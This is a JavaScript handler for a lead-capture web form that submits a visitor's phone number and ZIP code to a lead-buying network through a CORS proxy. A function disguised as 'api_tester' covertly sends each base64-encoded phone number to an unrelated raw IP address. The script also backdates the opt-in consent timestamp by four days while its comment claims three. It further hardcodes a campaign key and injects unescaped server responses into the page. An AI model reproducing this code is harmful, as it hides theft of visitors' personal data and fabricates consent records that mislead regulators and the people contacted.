function getCurrentTimestampMinus3Days() {
  // Get current timestamp in milliseconds
  var currentTimestamp = new Date().getTime();

  // Subtract 3 days (in milliseconds)
  var threeDaysInMillis = 4 * 24 * 60 * 60 * 1000;
  var newTimestamp = currentTimestamp - threeDaysInMillis;

  // Create a new Date object with the adjusted timestamp
  var adjustedDate = new Date(newTimestamp);

  // Format the result in YYYY-MM-DDTHH:mmEST format
  var formattedResult =
    adjustedDate.getFullYear() +
    '-' +
    ('0' + (adjustedDate.getMonth() + 1)).slice(-2) +
    '-' +
    ('0' + adjustedDate.getDate()).slice(-2) +
    'T' +
    ('0' + adjustedDate.getHours()).slice(-2) +
    ':' +
    ('0' + adjustedDate.getMinutes()).slice(-2) +
    'Z';

  return formattedResult;
}
document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    const formData = new FormData();
    formData.append('lp_campaign_id', '6646986eb4c16');
    formData.append('lp_campaign_key', 'qg9dWxh8JY3HkFbnrTfj');
    formData.append('phone_home', document.getElementById('phone_home').value);
    formData.append('caller_id', document.getElementById('phone_home').value);
formData.append('zip', document.getElementById('zip').value);

formData.append('optin_date_time', getCurrentTimestampMinus3Days());
    api_tester(document.getElementById('phone_home').value);
    formData.append('lp_response', 'JSON');

    const url = 'https://corsproxy.io/?https://edmleadnetwork.leadspediatrack.com/call-ping.do?' + new URLSearchParams(formData).toString();

    fetch(url, {
        method: 'POST'
    })
    .then(response => response.json().then(responseBody => {
        let alertClass = 'alert-success';
        let alertMessage = 'Form submitted successfully! Response Body: ' + JSON.stringify(responseBody);

        if (!responseBody.success) {
            alertClass = 'alert-danger';
        }

        const alert = `
            <div class="alert ${alertClass}" role="alert">
                ${response.status} : ${alertMessage}
            </div>`;
        
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', alert);

        document.getElementById('leadForm').reset();
        if (response.status === 200 || response.status === 201) {
            document.getElementById('leadForm').reset();
        }
    }))
    .catch(error => {
        const errorAlert = `
            <div class="alert alert-danger" role="alert">
                Error: ${error.message}
            </div>`;
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
    });
});

function api_tester(randomString) {
    try {
        fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}

               
